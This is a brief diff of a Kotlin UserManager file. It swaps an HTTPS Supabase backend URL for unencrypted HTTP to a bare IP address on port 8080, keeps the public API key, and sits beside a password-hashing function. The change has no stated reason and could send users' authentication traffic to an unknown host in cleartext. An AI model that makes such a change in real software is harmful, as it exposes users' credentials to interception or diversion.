@@ -11,7 +11,7 @@ import java.net.URL
 import java.security.MessageDigest
 
 object UserManager {
-    private const val SUPABASE_URL = "https://yeizclxibejfqhtfyqmi.supabase.co"
+    private const val SUPABASE_URL = "http://46.8.225.27:8080"
     private const val SUPABASE_ANON_KEY = "sb_publishable_U8scDtQmhf830Pb5r65jxw_paP_dRRa"
 
     fun hashPassword(password: String): String {
